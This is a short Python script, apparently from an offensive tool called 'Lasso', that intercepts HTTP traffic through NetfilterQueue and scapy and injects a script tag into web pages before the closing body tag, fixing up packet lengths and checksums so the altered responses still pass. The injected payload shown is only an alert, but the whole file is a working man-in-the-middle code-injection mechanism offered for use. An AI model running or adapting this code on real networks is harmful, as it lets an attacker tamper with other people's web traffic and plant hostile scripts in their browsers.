from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if b"HTTP/1.1" in scapy_packet[scapy.Raw].load and b"</body>" in scapy_packet[scapy.Raw].load:
            injection_code = b'<script>alert("Injected by Lasso!");</script>'
            modified_payload = scapy_packet[scapy.Raw].load.replace(b"</body>", injection_code + b"</body>")
            scapy_packet[scapy.Raw].load = modified_payload
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()

def start_packet_inject():
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
